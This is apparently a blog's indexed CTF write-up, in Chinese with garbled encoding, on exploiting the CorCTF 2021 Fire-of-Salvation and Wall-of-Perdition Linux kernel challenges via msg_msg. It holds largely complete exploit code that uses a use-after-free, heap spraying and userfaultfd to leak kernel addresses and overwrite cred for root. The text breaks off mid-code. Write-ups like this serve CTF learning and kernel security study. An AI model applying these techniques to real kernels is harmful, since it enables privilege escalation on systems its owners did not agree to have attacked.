","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:2:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#å†…æ ¸ipc--msgsndä¸msgrcvæºç åˆ†æ"},{"categories":["Writeups"],"content":"msgsnd() æ•°æ®å‘é€æ€»ä½“æµç¨‹ï¼šå½“è°ƒç”¨Â msgsnd()Â æ¥å‘é€æ¶ˆæ¯æ—¶ï¼Œè°ƒç”¨Â msgsnd() -\u003eÂ ksys_msgsnd() -\u003eÂ do_msgsnd()Â -\u003eÂ load_msg()Â -\u003eÂ alloc_msg()Â æ¥åˆ†é…æ¶ˆæ¯å¤´å’Œæ¶ˆæ¯æ•°æ®ï¼Œç„¶åè°ƒç”¨Â load_msg()Â -\u003eÂ copy_from_user()Â æ¥å°†ç”¨æˆ·æ•°æ®æ‹·è´è¿›å†…æ ¸ã€‚ é‡ç‚¹çœ‹ä¸€ä¸‹å†…å­˜çš„åˆ†é…ï¼š static struct msg_msg *alloc_msg(size_t len) { struct msg_msg *msg; struct msg_msgseg **pseg; size_t alen; alen = min(len, DATALEN_MSG); msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT); if (msg == NULL) return NULL; msg-\u003enext = NULL; msg-\u003esecurity = NULL; len -= alen; pseg = \u0026msg-\u003enext; while (len \u003e 0) { struct msg_msgseg *seg; cond_resched(); alen = min(len, DATALEN_SEG); seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT); if (seg == NULL) goto out_err; *pseg = seg; seg-\u003enext = NULL; pseg = \u0026seg-\u003enext; len -= alen; } return msg; out_err: free_msg(msg); return NULL; } å¦‚æœæ¶ˆæ¯é•¿åº¦è¶…è¿‡0xfd0ï¼Œåˆ™åˆ†æ®µå­˜å‚¨ï¼Œé‡‡ç”¨å•é“¾è¡¨è¿æ¥ï¼Œç¬¬1ä¸ªç§°ä¸ºæ¶ˆæ¯å¤´ï¼Œç”¨Â msg_msgÂ ç»“æ„å­˜å‚¨ï¼›ç¬¬2ã€3ä¸ªç§°ä¸ºsegmentï¼Œç”¨Â msg_msgsegÂ ç»“æ„å­˜å‚¨ã€‚æ¶ˆæ¯çš„æœ€å¤§é•¿åº¦Â /proc/sys/kernel/msgmax ç¡®å®šï¼Œ é»˜è®¤å¤§å°ä¸º 8192 å­—èŠ‚ï¼Œæ‰€ä»¥æœ€å¤šé“¾æ¥3ä¸ªæˆå‘˜ã€‚ ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:2:1","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#msgsnd-æ•°æ®å‘é€"},{"categories":["Writeups"],"content":"msgsrv()Â æ•°æ®æ¥æ”¶æ€»ä½“æµç¨‹ï¼šÂ msgrcv()Â -\u003eÂ ksys_msgrcv()Â -\u003eÂ do_msgrcv()Â -\u003eÂ find_msg()Â \u0026Â do_msg_fill()Â \u0026Â free_msg()ã€‚ è°ƒç”¨Â find_msg()Â æ¥å®šä½æ­£ç¡®çš„æ¶ˆæ¯ï¼Œå°†æ¶ˆæ¯ä»é˜Ÿåˆ—ä¸­unlinkï¼Œå†è°ƒç”¨Â do_msg_fill()Â -\u003eÂ store_msg() æ¥å°†å†…æ ¸æ•°æ®æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œæœ€åè°ƒç”¨Â free_msg()Â é‡Šæ”¾æ¶ˆæ¯ã€‚ static long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg, long (*msg_handler)(void __user *, struct msg_msg *, size_t)) { int mode; struct msg_queue *msq; struct ipc_namespace *ns; struct msg_msg *msg, *copy = NULL; DEFINE_WAKE_Q(wake_q); // ... msg = find_msg(msq, \u0026msgtyp, mode); if (!IS_ERR(msg)) { /* * Found a suitable message. * Unlink it from the queue. */ if ((bufsz \u003c msg-\u003em_ts) \u0026\u0026 !(msgflg \u0026 MSG_NOERROR)) { msg = ERR_PTR(-E2BIG); goto out_unlock0; } /* * If we are copying, then do not unlink message and do * not update queue parameters. */ if (msgflg \u0026 MSG_COPY) { msg = copy_msg(msg, copy); goto out_unlock0; } list_del(\u0026msg-\u003em_list); msq-\u003eq_qnum--; msq-\u003eq_rtime = ktime_get_real_seconds(); ipc_update_pid(\u0026msq-\u003eq_lrpid, task_tgid(current)); msq-\u003eq_cbytes -= msg-\u003em_ts; atomic_sub(msg-\u003em_ts, \u0026ns-\u003emsg_bytes); atomic_dec(\u0026ns-\u003emsg_hdrs); ss_wakeup(msq, \u0026wake_q, false); goto out_unlock0; } // ... out_unlock0: ipc_unlock_object(\u0026msq-\u003eq_perm); wake_up_q(\u0026wake_q); out_unlock1: rcu_read_unlock(); if (IS_ERR(msg)) { free_copy(copy); return PTR_ERR(msg); } bufsz = msg_handler(buf, msg, bufsz); free_msg(msg); return bufsz; } å¦‚æœå‘ç°äº†åˆé€‚çš„æ¶ˆæ¯ï¼Œä¼šå°†å…¶æ‹·è´ç»™ç”¨æˆ·ï¼Œè‹¥æ˜¯æœªè®¾ç½®MSG_COPY å­—æ®µï¼Œä¼šå°†æ¶ˆæ¯è¿›è¡Œunlinkã€‚ æ¶ˆæ¯æ‹·è´ï¼šdo_msg_fill()Â -\u003eÂ store_msg()Â ã€‚å’Œåˆ›å»ºæ¶ˆæ¯çš„è¿‡ç¨‹ä¸€æ ·ï¼Œå…ˆæ‹·è´æ¶ˆæ¯å¤´ï¼ˆmsg_msgç»“æ„å¯¹åº”çš„æ•°æ®ï¼‰ï¼Œå†æ‹·è´segmentï¼ˆmsg_msgsegç»“æ„å¯¹åº”çš„æ•°æ®ï¼‰ã€‚ static long do_msg_fill(void __user *dest, struct msg_msg *msg, size_t bufsz) { struct msgbuf __user *msgp = dest; size_t msgsz; if (put_user(msg-\u003em_type, \u0026msgp-\u003emtype)) return -EFAULT; msgsz = (bufsz \u003e msg-\u003em_ts) ? msg-\u003em_ts : bufsz; if (store_msg(msgp-\u003emtext, msg, msgsz)) return -EFAULT; return msgsz; } int store_msg(void __user *dest, struct msg_msg *msg, size_t len) { size_t alen; struct msg_msgseg *seg; alen = min(len, DATALEN_MSG); if (copy_to_user(dest, msg + 1, alen)) return -1; for (seg = msg-\u003enext; seg != NULL; seg = seg-\u003enext) { len -= alen; dest = (char __user *)dest + alen; alen = min(len, DATALEN_SEG); if (copy_to_user(dest, seg + 1, alen)) return -1; } return 0; } æ¶ˆæ¯é‡Šæ”¾ï¼šfree_msgã€‚å…ˆé‡Šæ”¾æ¶ˆæ¯å¤´ï¼Œå†é‡Šæ”¾segmentã€‚ void free_msg(struct msg_msg *msg) { struct msg_msgseg *seg; security_msg_msg_free(msg); seg = msg-\u003enext; kfree(msg); while (seg != NULL) { struct msg_msgseg *tmp = seg-\u003enext; cond_resched(); kfree(seg); seg = tmp; } } MSG_COPYï¼šå¦‚æœç”¨flagÂ MSG_COPYæ¥è°ƒç”¨Â msgrcv()Â ï¼ˆå†…æ ¸ç¼–è¯‘æ—¶éœ€é…ç½®CONFIG_CHECKPOINT_RESTOREé€‰é¡¹ï¼Œé»˜è®¤å·²é…ç½®ï¼‰ï¼Œå°±ä¼šè°ƒç”¨Â prepare_copy()Â åˆ†é…ä¸´æ—¶æ¶ˆæ¯ï¼Œå¹¶è°ƒç”¨Â copy_msg()Â å°†è¯·æ±‚çš„æ•°æ®æ‹·è´åˆ°è¯¥ä¸´æ—¶æ¶ˆæ¯ã€‚åœ¨å°†æ¶ˆæ¯æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ä¹‹åï¼ŒåŸå§‹æ¶ˆæ¯ä¼šè¢«ä¿ç•™ï¼Œä¸ä¼šä»é˜Ÿåˆ—ä¸­unlinkï¼Œç„¶åè°ƒç”¨free_msg()åˆ é™¤è¯¥ä¸´æ—¶æ¶ˆæ¯ï¼Œè¿™å¯¹äºåˆ©ç”¨å¾ˆé‡è¦ã€‚ ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºæœ¬æ¼æ´åœ¨ç¬¬ä¸€æ¬¡UAFçš„æ—¶å€™ï¼Œæ²¡æœ‰æ³„éœ²æ­£ç¡®åœ°å€ï¼Œæ‰€ä»¥ä¼šç ´åmsg_msg-\u003em_list åŒé“¾è¡¨æŒ‡é’ˆï¼Œunlinkä¼šè§¦å‘å´©æºƒ ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:2:2","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#msgsrvæ•°æ®æ¥æ”¶"},{"categories":["Writeups"],"content":"Fire-of-Salvation","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:3:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#fire-of-salvation"},{"categories":["Writeups"],"content":"è¶Šç•Œè¯»æ³„éœ²å†…æ ¸åœ°å€é¦–å…ˆï¼Œå¯¹ä¸€ä¸ªrule_tè¿›è¡ŒUAFï¼Œåªè¦addï¼Œdupï¼Œfreeå³å¯ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬æ§åˆ¶äº†ä¸€ä¸ªç©ºé—²çš„kmalloc-4096ç»“æ„ã€‚ æ¥ç€ï¼Œå‘é€ä¸€ä¸ª0xfd0+0x30å¤§å°çš„æ¶ˆæ¯ã€‚msg_msgç»“æ„ä¼šå æ®æˆ‘ä»¬æ§åˆ¶çš„kmalloc-4096ï¼Œå…¶nextæŒ‡å‘äº†ä¸€ä¸ªkmalloc-64å†…å­˜å—ã€‚ç„¶åï¼Œé€šè¿‡UAFæ”¹å¤§msg_msgçš„m_tsç»“æ„å°±èƒ½è¶Šç•Œè¯»segmentåé¢çš„å†…å­˜ã€‚ è¿™é‡Œçš„é—®é¢˜æ˜¯ä¸èƒ½ç¡®å®šsegmentåé¢æœ‰ä»€ä¹ˆæ ·çš„åœ°å€ä¿¡æ¯ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å‘é€æ¶ˆæ¯åï¼Œå–·å°„å¤§é‡çš„shm_file_dataç»“æ„ã€‚ struct shm_file_data { int id; struct ipc_namespace *ns; struct file *file; const struct vm_operations_struct *vm_ops; }; è¿™æ ·å°±å¯ä»¥è¯»åˆ°init_ipc_nsçš„å€¼ï¼Œè¯¥æ•°æ®ä¸ºå…¨å±€å˜é‡ä¸å—FG_KALSRå½±å“ã€‚ send_msg(qid, message, 0x1010 - 0x30, 0); printf(\"[*] Heap spary...\\n\"); heap_spary(0x80); printf(\"[*] Edit msg...\\n\"); ((struct msg_msg *)rule)-\u003em_list.next = (void *)0xAAAAAAAA; ((struct msg_msg *)rule)-\u003em_list.prev = (void *)0xBBBBBBBB; ((struct msg_msg *)rule)-\u003em_ts = 0x1000 + 0x500; ((struct msg_msg *)rule)-\u003em_type = 1; rule-\u003eidx = 0; rule-\u003etype = OUTBOUND; strcpy(rule-\u003eip, \"000000000\"); ioctl(global_fd, EDIT_RULE, rule); uint64_t *dump = calloc(1, 0x1500); printf(\"[+] dump:\\t%p\\n\", dump); ret = msgrcv(qid, dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR); if (ret \u003c 0) { die(\"[!] Failed to recv message\"); } int i; for (i = 0xff0 / 8; i \u003c 0x1500 / 8; i++) { if ((dump[i] \u0026 0xfff) == 0x7a0) { init_ipc_ns = dump[i]; printf(\"[+] index: %d\\n\", i); break; } } kernbase = init_ipc_ns - 0xc3d7a0; init_task = kernbase + 0xc124c0; init_cred = kernbase + 0xc33060; è¿™æ ·æˆ‘ä»¬å¾—åˆ°äº†å†…æ ¸åŸºå€ï¼Œinit_taskå’Œinit_credã€‚ ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:3:1","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#è¶Šç•Œè¯»æ³„éœ²å†…æ ¸åœ°å€"},{"categories":["Writeups"],"content":"ä»»æ„åœ°å€è¯» \u0026 task_struct éå†æˆ‘ä»¬ä½¿ç”¨äº†MSG_COPYï¼Œå†…æ ¸ä¸­çš„æ¶ˆæ¯å¹¶æ²¡æœ‰è¢«freeï¼Œå¯ä¾›æˆ‘ä»¬å¤šæ¬¡è¯»å–ã€‚æˆ‘ä»¬å¯ä»¥UAFä¿®æ”¹nextå­—æ®µä¸ºä»»æ„å€¼ï¼Œå®ç°ä»»æ„åœ°å€è¯»ã€‚ é€šè¿‡éå†init_taskçš„tasksé“¾è¡¨ï¼Œæ‰¾åˆ°å½“å‰è¿›ç¨‹çš„task_structã€‚ printf(\"[*] Task struct searching...\\n\"); pid_t pid = getpid(); printf(\"[+] self pid:\\t%d\\n\", pid); uint64_t cur = init_task; for (;;) { pid_t cur_id = 0; bzero(rule-\u003eip, 16); ip_value_to_str(cur + 0x290, rule-\u003eip, 16); ip_value_to_str((cur + 0x290) \u003e\u003e 32, rule-\u003enetmask, 16); ioctl(global_fd, EDIT_RULE, rule); bzero(dump, 0x1500); ret = msgrcv(qid, dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR); if (ret \u003c 0) { die(\"[!] Failed to recv message\"); } // read pid cur_id = *((uint32_t *)((uint64_t)dump + 0x10d8)); printf(\"[+] cur:\\t0x%lx, pid:\\t%d\\n\", cur, cur_id); if (cur_id == pid) { task_struct = cur; break; } // next cur = *((uint64_t *)((uint64_t)dump + 0xfe0)) - 0x298; } printf(\"[+] task_struct:\\t0x%lx\\n\", task_struct); ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:4:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#ä»»æ„åœ°å€è¯»--task_struct-éå†"},{"categories":["Writeups"],"content":"ä»»æ„åœ°å€å†™åœ¨å‘é€æ¶ˆæ¯æ—¶ï¼Œå†…æ ¸å…ˆå°†å†…å­˜ç©ºé—´å‡†å¤‡å¥½ï¼Œå†è¿›è¡Œæ•°æ®æ‹·è´ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨userfaultfdï¼Œåœ¨å…¶æ‹·è´msg_msgç»“æ„æ•°æ®æ—¶ï¼ŒæŒ‚èµ·ã€‚ä¿®æ”¹å…¶nextå­—æ®µæŒ‡å‘å½“å‰è¿›ç¨‹çš„cred-8ï¼Œä¿æŒsegmentçš„nextä¸ºNULLã€‚ é‡Šæ”¾ï¼Œä¿®æ”¹credå’Œreal_credä¸ºinit_credå®ç°ææƒã€‚ ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:4:1","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#ä»»æ„åœ°å€å†™"},{"categories":["Writeups"],"content":"EXP #include \"./exploit.h\" #define ADD_RULE 0x1337babe #define DELETE_RULE 0xdeadbabe #define EDIT_RULE 0x1337beef #define SHOW_RULE 0xdeadbeef #define DUP_RULE 0xbaad5aad #define INBOUND 0 #define OUTBOUND 1 #define SKIP -1 #define DESC_MAX 0x800 typedef struct { char iface[16]; char name[16]; char ip[16]; char netmask[16]; uint8_t idx; uint8_t type; uint16_t proto; uint16_t port; uint8_t action; char desc[DESC_MAX]; } user_rule_t; struct list_head { struct list_head *next, *prev; }; struct msg_msg { struct list_head m_list; long m_type; size_t m_ts; /* message text size */ void *next; /* struct msg_msgseg *next; */ void *security; //æ— SELinuxï¼Œè¿™é‡Œä¸ºNULL /* the actual message follows immediately */ }; typedef struct { long mtype; char mtext[1]; } msg; int global_fd; uint64_t kernbase, init_ipc_ns, init_task, init_cred; uint64_t task_struct; int qid; char msg_buf[0x2000]; void ip_value_to_str(int ip, char *result, int size) { inet_ntop(AF_INET, (void *)\u0026ip, result, size); } void add_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, ADD_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to add rule\"); } } void dup_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, DUP_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to dup rule\"); } } void del_rule(user_rule_t *rule) { int ret = 0; ret = ioctl(global_fd, DELETE_RULE, rule); if (ret \u003c 0) { die(\"[!] Failed to del rule\"); } } void send_msg(int id, void *buf, size_t size, int flags) { if (msgsnd(id, buf, size, flags) \u003c 0) { die(\"[!] Failed to send msg\"); } printf(\"[+] Send message: 0x%lx\\n\", size); } void heap_spary(size_t cnt) { int i = 0; int shmid = 0; void *addr = NULL; for (i = 0; i \u003c cnt; i++) { shmid = shmget(IPC_PRIVATE, 100, 0600); if (shmid \u003c 0) { die(\"[!] shmget failed\"); } addr = shmat(shmid, NULL, 0); if (addr == (void *)-1) { die(\"[!] shmat failed\"); } } printf(\"[+] heap_spary shm, cnt:\\t0x%lx\\n\", cnt); } static void fault_handler_thread(void *arg) { puts(\"[+] entered fault_handler_thread!\"); static struct uffd_msg uf_msg; uint64_t uffd = (uint64_t)arg; struct pollfd pollfd; int nready; pollfd.fd = uffd; pollfd.events = POLLIN; puts(\"[+] polling...\"); while ((nready = poll(\u0026pollfd, 1, -1)) \u003e 0) { if (pollfd.revents \u0026 POLLERR || pollfd.revents \u0026 POLLHUP) { die(\"[!] poll failed\\n\"); } if ((read(uffd, \u0026uf_msg, sizeof(uf_msg))) == 0) { die(\"[!] read uffd msg failed\\n\"); } if (uf_msg.event != UFFD_EVENT_PAGEFAULT) { die(\"[!] unexpected pagefault\\n\"); } printf(\"[+] page fault: %p\\n\", (void *)uf_msg.arg.pagefault.address); printf(\"[*] Change next to task_struct-\u003ecred\\n\"); user_rule_t *rule = calloc(1, sizeof(user_rule_t)); ((struct msg_msg *)rule)-\u003em_list.next = (void *)0xAAAAAAAA; ((struct msg_msg *)rule)-\u003em_list.prev = (void *)0xBBBBBBBB; ((struct msg_msg *)rule)-\u003em_ts = 0x1000 + 0x500; ((struct msg_msg *)rule)-\u003em_type = 1; rule-\u003eidx = 1; rule-\u003etype = OUTBOUND; ip_value_to_str(task_struct + 0x530, rule-\u003eip, 16); ip_value_to_str((task_struct + 0x530) \u003e\u003e 32, rule-\u003enetmask, 16); ioctl(global_fd, EDIT_RULE, rule); bzero(msg_buf, 0x2000); int idx = 0xfd0 / 8; ((uint64_t *)msg_buf)[idx++] = init_cred; ((uint64_t *)msg_buf)[idx++] = init_cred; ((uint64_t *)msg_buf)[idx++] = init_cred; ((uint64_t *)msg_buf)[idx++] = init_cred; uffd_copy(uffd, msg_buf, \u0026uf_msg); break; } puts(\"[+] exit fault_handler_thread!\"); } int main() { user_rule_t *rule = calloc(1, sizeof(user_rule_t)); msg *message = (msg *)msg_buf; int ret = 0; global_fd = open(\"/dev/firewall\", O_RDWR); if (global_fd \u003c 0) { die(\"[!] Failed to open /dev/firewall\"); } qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT); if (qid \u003c 0) { die(\"[!] Failed to msgget\"); } printf(\"[+] qid = %d\\n\", qid); printf(\"[*] UAF prepare...\\n\"); rule-\u003eidx = 0; rule-\u003etype = INBOUND; strcpy(rule-\u003enetmask, \"255.255.255.255\"); strcpy(rule-\u003eip, \"127.0.0.1\"); add_rule(rule); dup_rule(rule); del_rule(rule); printf(\"[*] Send message\\n\"); bzero(msg_buf, 0x2000); message-\u003emtype = 1; memset(message-\u003emtext, 'A', 0x1010); send_msg(qid, message, 0x1010 - 0x30","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:4:2","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#exp"},{"categories":["Writeups"],"content":"Wall-of-PerditionUAFä¾ç„¶å­˜åœ¨ï¼Œä½†åœ¨kmalloc-64ä¸­ã€‚æˆ‘ä»¬ä¾ç„¶å¯ä»¥é€šè¿‡ä¿®æ”¹m_tsè¿›è¡Œè¶Šç•Œè¯»ã€‚åœ¨æˆ‘ä»¬å¾—åˆ°å†…æ ¸çš„åŸºå€åï¼Œä¼¼ä¹å¹¶ä¸èƒ½è¿›è¡Œä»»æ„åœ°å€å†™äº†ã€‚ å®ç°ä»»æ„åœ°å€å†™éœ€è¦æ§åˆ¶nextæŒ‡é’ˆï¼Œå¦‚æœæƒ³è¦æ§åˆ¶msg_msgç»“æ„çš„nextï¼Œæ¶ˆæ¯å¤§å°å°±å¤§äº64ï¼Œä¸ä¼šç”³è¯·åˆ°kmalloc-64ã€‚å¦‚æœæƒ³æ§åˆ¶kmalloc-64çš„segmentçš„nextï¼Œm_tsä¸èƒ½ä¿®æ”¹ï¼Œä¸èƒ½è¿›è¡Œè¶Šç•Œã€‚å¦ä¸€ç§æ€è·¯æ˜¯ç›´æ¥ä¿®æ”¹nextï¼Œä½†æ˜¯æ­¤æ—¶ä¼šé‡åˆ°ä¸ç¬¬ä¸€ç§ç›¸åŒçš„æƒ…å†µï¼Œsegmentå¤§å°å¤§äº64æ— æ³•UAFã€‚ å®ç°ä»»æ„å†™æœ€é‡è¦çš„æ˜¯ä½¿ä¸€ä¸ªmsg_msgç»“æ„å‡ºç°åœ¨å¯æ§çš„ç©ºé—´ã€‚ ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:5:0","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#wall-of-perdition"},{"categories":["Writeups"],"content":"æ³„éœ²å†…æ ¸åŸºå€ \u0026 msg é“¾è¡¨æ„é€ ä¸€ä¸ªUAFçš„kmalloc-64ï¼Œç„¶åç”³è¯·ä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼š qid[0] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT); if (qid[0] \u003c 0) { die(\"[!] Failed to msgget\"); } qid[1] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT); if (qid[1] \u003c 0) { die(\"[!] Failed to msgget\"); } printf(\"[+] qid[0] = %d, qid[1] = %d\\n\", qid[0], qid[1]); åœ¨QID#0ä¸Šå‘é€ä¸€ä¸ª0x10çš„æ¶ˆæ¯ï¼ˆå®é™…0x10+0x30ï¼‰ï¼ŒQID#1ä¸Šå‘é€ä¸€ä¸ª0x10çš„æ¶ˆæ¯ï¼Œå†å‘é€ä¸€ä¸ª0xfd0+0xff8å¤§å°çš„æ¶ˆæ¯ã€‚ bzero(msg_buf, 0x2000); message-\u003emtype = 1; memset(message-\u003emtext, 0x41, 0x10); send_msg(qid[0], message, 0x40 - 0x30, 0); memset(message-\u003emtext, 0x42, 0x10); send_msg(qid[1], message, 0x40 - 0x30, 0); send_msg(qid[1], message, 0x1ff8 - 0x30, 0); æ­¤æ—¶ï¼ŒQID#0ä¸Šçš„æ¶ˆæ¯å°±æ˜¯UAFæ§åˆ¶çš„kmalloc-64å—ã€‚ æ­¤æ—¶çš„å †å¸ƒå±€å¦‚ä¸‹ ä¸€ä¸ªmsg_msgæ¶ˆæ¯çš„æœ€å¤§ä¸º0x2000ï¼Œæˆ‘ä»¬ä¿®æ”¹QID#0æ¶ˆæ¯çš„å¤§å°ï¼Œè¯»å–æ•°æ®ã€‚å› ä¸ºQID#0å’ŒQID#1çš„0x10æ¶ˆæ¯å±äºåŒä¸€ä¸ªå¤§å°ï¼Œä¸¤è€…çš„è·ç¦»å¯èƒ½å¾ˆè¿‘ã€‚æˆ‘ä»¬å°±èƒ½è¯»å–QID#2çš„0x10æ¶ˆæ¯çš„list_headï¼Œè¿˜èƒ½å¾—åˆ°å…¨å±€å˜é‡ dynamic_kobj_ktype æ³„éœ²å†…æ ¸åŸºå€ã€‚é¢˜ç›®ä½œè€…æ³„éœ²çš„æ˜¯sysfs_bin_kfops_roã€‚ å¦‚ä¸‹å›¾ï¼š ((struct msg_msg *)rule)-\u003em_list.next = (void *)0xAAAAAAAA; ((struct msg_msg *)rule)-\u003em_list.prev = (void *)0xBBBBBBBB; ((struct msg_msg *)rule)-\u003em_ts = 0x2000; ((struct msg_msg *)rule)-\u003em_type = 1; rule-\u003eidx = 0; rule-\u003etype = OUTBOUND; strcpy(rule-\u003eip, \"000000000\"); ioctl(global_fd, EDIT_RULE, rule); void *dump = calloc(1, 0x2000); printf(\"[+] dump:\\t%p\\n\", dump); ret = msgrcv(qid[0], dump, 0x2000, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR); if (ret \u003c 0) { die(\"[!] Failed to recv message\"); } int i = 0; uint64_t val = 0; for (i = 0; i \u003c 0x2000 / 8; i++) { val = ((uint64_t *)dump)[i]; if ((val \u0026 0xffffffff) == 0x42424242) { next = ((uint64_t *)dump)[i - 6]; prev = ((uint64_t *)dump)[i - 5]; // skip i++; } if ((val \u0026 0xffff) == 0x1600) { dynamic_kobj_ktype = val; } if ((dynamic_kobj_ktype != 0) \u0026\u0026 (next != 0) \u0026\u0026 (prev != 0)) break; } if (((int64_t)next \u003e= 0) || ((int64_t)prev \u003e= 0)) { printf(\"[!] Failed to get next and prev, try again\\n\"); goto done; } kernbase = dynamic_kobj_ktype - 0xc41600; init_task = kernbase + 0xc124c0; init_cred = kernbase + 0xc33060; è¿™é‡Œå¾—åˆ°nextå’Œprevçš„å€¼æœ‰ä¸€å®šçš„æ¦‚ç‡ã€‚ ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:5:1","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#æ³„éœ²å†…æ ¸åŸºå€--msg-é“¾è¡¨"},{"categories":["Writeups"],"content":"ä»»æ„åœ°å€è¯» \u0026 task_struct éå†ä¿®æ”¹UAFçš„å—çš„nextä¸ºç›®æ ‡åœ°å€-8å³å¯å®ç°ä»»æ„åœ°å€è¯»ï¼ŒåŒç¬¬ä¸€é¢˜å¯¹tasksè¿›è¡Œéå†æ‰¾åˆ°å½“å‰è¿›ç¨‹çš„task_structã€‚ printf(\"[*] Task struct searching...\\n\"); pid_t pid = getpid(); printf(\"[+] self pid:\\t%d\\n\", pid); uint64_t cur = init_task; ((struct msg_msg *)rule)-\u003em_ts = 0xfd0 + 0x200; for (;;) { pid_t cur_id = 0; bzero(rule-\u003eip, 16); ip_value_to_str(cur + 0x290, rule-\u003eip, 16); ip_value_to_str((cur + 0x290) \u003e\u003e 32, rule-\u003enetmask, 16); ioctl(global_fd, EDIT_RULE, rule); bzero(dump, 0x1500); ret = msgrcv(qid[0], dump, 0x1500, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR); if (ret \u003c 0) { die(\"[!] Failed to recv message\"); } // read pid cur_id = *((uint32_t *)((uint64_t)dump + 0x10d8)); printf(\"[+] cur:\\t0x%lx, pid:\\t%d\\n\", cur, cur_id); if (cur_id == pid) { task_struct = cur; break; } // next cur = *((uint64_t *)((uint64_t)dump + 0xfe0)) - 0x298; } printf(\"[+] task_struct:\\t0x%lx\\n\", task_struct); ","date":"2022-03-18","objectID":"/corctf2021-msg_msg/:5:2","series":null,"tags":["Writeups","Kernel"],"title":"CorCTF2021 Msg_msg","uri":"/corctf2021-msg_msg/#ä»»æ„åœ°å€è¯»--task_struct-éå†-1"},{"categories":["Writeups"],"content":"å †é£æ°´æ„é€ ä»»æ„åœ°å€å†™ä¸‹é¢åˆ°äº†æœ€å…³é”®çš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°†é€šè¿‡å †é£æ°´ä¸userfaultfdå®ç°ä»»æ„åœ°å€å†™ï¼Œä»è€Œææƒï¼ é¦–å…ˆï¼Œæ¥æ”¶QID#1çš„æ‰€æœ‰æ¶ˆæ¯ï¼Œä¸å¸¦MSG_COPYæ ‡å¿—ã€‚è¿™æ ·QID#1ä¸­çš„kmalloc-64å’Œä¸¤ä¸ªkmalloc-4096éƒ½è¢«freeäº†ï¼Œä¸”å…ˆè¢«freeçš„æ˜¯msg_msgéƒ¨åˆ†ã€‚ æ¥ç€ï¼Œæˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—QID#2ï¼Œå‘é€ä¸€ä¸ª0x1ff8 - 0x30å¤§å°çš„æ¶ˆæ¯ï¼Œmsg_msgä½¿ç”¨çš„æ­£æ˜¯åŸæ¥çš„segmentç»“æ„ï¼Œè€Œå…¶nextæŒ‡å‘äº†åŸæœ¬çš„msg_msgç»“æ„ï¼Œè¿™éƒ¨åˆ†çš„åœ°å€æ˜¯æˆ‘ä»¬å·²çŸ¥çš„ï¼Œå³list_headâ†’nextã€‚åŒæ—¶ï¼Œæˆ‘ä»¬åœ¨å…¶æ‹·è´msg_msgæ¶ˆæ¯æ•°æ®æ—¶ï¼Œä½¿ç”¨userfaultfdå¡ä½ã€‚å¸ƒå±€å¦‚ä¸‹å›¾ï¼š åœ¨userfault handlerä¸­ï¼Œä¿®æ”¹QID#0çš„æ¶ˆæ¯çš„nextæŒ‡å‘QID#2æ¶ˆæ¯çš„segmentï¼Œä¿®æ­£å…¶listå’Œm_tsï¼Œç„¶åæ¥æ”¶æ‰€æœ‰æ¶ˆæ¯ï¼Œä¸å¸¦MSG_COPYæ ‡å¿—ã€‚è¿™æ ·ï¼ŒQID#2çš„segmentå°±ä¼šè¢«freeäº†ã€‚ printf(\"[+] page fault: %p\\n\", (void *)uf_msg.arg.pagefault.address); printf(\"[*] Modified msg0 next to msg2's segment\\n\"); user_rule_t *rule = calloc(1, sizeof(user_rule_t)); ((struct msg_msg *)rule)-\u003em_list.next = (void *)prev; ((struct msg_msg *)rule)-\u003em_list.prev = (void *)prev; ((struct msg_msg *)rule)-\u003em_ts = 0x10; ((struct msg_msg *)rule)-\u003em_type = 1; rule-\u003eidx = 